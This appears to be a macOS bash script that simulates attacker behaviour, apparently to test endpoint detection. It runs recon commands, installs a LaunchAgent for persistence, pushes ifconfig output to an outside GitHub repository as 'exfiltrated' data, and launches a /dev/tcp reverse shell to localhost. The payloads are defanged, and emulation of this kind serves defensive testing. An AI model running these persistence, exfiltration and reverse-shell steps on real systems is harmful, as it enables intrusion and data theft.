#!/bin/bash

# Simulated reconnaissance
whoami
uname -a
ifconfig > /tmp/netinfo.txt

# Simulated persistence (user-level)
mkdir -p ~/Library/LaunchAgents

echo 'echo "Fake persistence ran!"' > ~/fake_persist.sh
chmod +x ~/fake_persist.sh

cat <<EOF > ~/Library/LaunchAgents/com.fake.persistence.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.fake.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>${HOME}/fake_persist.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# Load the LaunchAgent (no sudo needed)
launchctl load ~/Library/LaunchAgents/com.fake.persistence.plist

# Clone the repo (use your token for write access)
git clone https://github.com/yuvalgv7/CS-Test-1234.git repo-copy
mkdir -p repo-copy/victims
cd repo-copy/victims

# Add and push the stolen data
mv /tmp/netinfo.txt .
git add netinfo.txt
git commit -m "Exfiltrated credentials"
git push

cd ../..
rm -rf repo-copy

# Reverse Shell
# Setup test directory
mkdir -p /tmp/cs_test_trigger
cd /tmp/cs_test_trigger || exit 1

# Create a reverse shell using suspicious bash syntax
cat << 'EOF' > revshell.sh
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
EOF

# Mark it executable
chmod +x revshell.sh

# Execute it — this should look very bad to EDRs
./revshell.sh

rm -rf /tmp/cs_test_trigger

# Visual indicator
open -a Calculator
